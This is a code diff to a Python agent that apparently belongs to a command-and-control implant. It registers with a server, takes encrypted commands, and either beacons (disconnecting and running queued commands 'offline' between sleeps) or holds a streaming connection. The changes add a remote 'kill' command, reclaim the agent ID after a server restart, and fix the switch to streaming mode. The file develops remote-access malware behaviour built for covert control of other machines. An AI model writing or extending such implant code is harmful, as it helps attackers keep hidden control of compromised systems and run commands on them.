@@ -167,8 +167,10 @@ async def connect_to_server():
                 reg_data = json.loads(decrypted)
 
                 if reg_data.get('type') in ['registered', 'checkin_ack']:
-                    if not agent_id:
-                        agent_id = reg_data.get('agent_id')
+                    # Always update agent_id if server sends one (handles server restart case)
+                    new_id = reg_data.get('agent_id')
+                    if new_id and new_id != agent_id:
+                        agent_id = new_id
                     heartbeat_task = None
 
                     if current_mode == 'streaming':
@@ -207,21 +209,30 @@ async def connect_to_server():
                                 elif data.get('type') == 'set_interval':
                                     beacon_interval = data.get('interval', beacon_interval)
 
+                                elif data.get('type') == 'kill':
+                                    # Exit agent
+                                    import sys
+                                    sys.exit(0)
+
                                 elif data.get('type') == 'upgrade_mode':
                                     current_mode = 'streaming'
+                                    # Start heartbeat for streaming mode
+                                    heartbeat_task = asyncio.create_task(heartbeat(websocket))
                                     mode_msg = {
                                         'type': 'mode_change',
                                         'mode': 'streaming'
                                     }
                                     encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                     await websocket.send(encrypted_msg)
+                                    # Don't break - fall through to streaming mode
+                                    pending_commands.clear()
                                     break
 
                             except asyncio.TimeoutError:
                                 # No more commands, proceed to disconnect
                                 break
 
-                        # Step 3: Disconnect and execute commands "offline"
+                        # Step 3: If still in beacon mode, execute commands offline
                         if current_mode == 'beacon':
                             # Execute all commands during sleep period
                             for cmd_data in pending_commands:
@@ -247,6 +258,8 @@ async def connect_to_server():
                             await asyncio.sleep(sleep_time)
                             continue
 
+                        # If we upgraded to streaming, don't disconnect - continue to streaming loop
+
                     # Streaming mode: maintain persistent connection
                     async for message in websocket:
                         try:
@@ -266,6 +279,11 @@ async def connect_to_server():
 
                             elif data.get('type') == 'set_interval':
                                 beacon_interval = data.get('interval', beacon_interval)
+
+                            elif data.get('type') == 'kill':
+                                # Exit agent
+                                import sys
+                                sys.exit(0)
 
                             elif data.get('type') == 'upgrade_mode':
                                 current_mode = 'streaming'
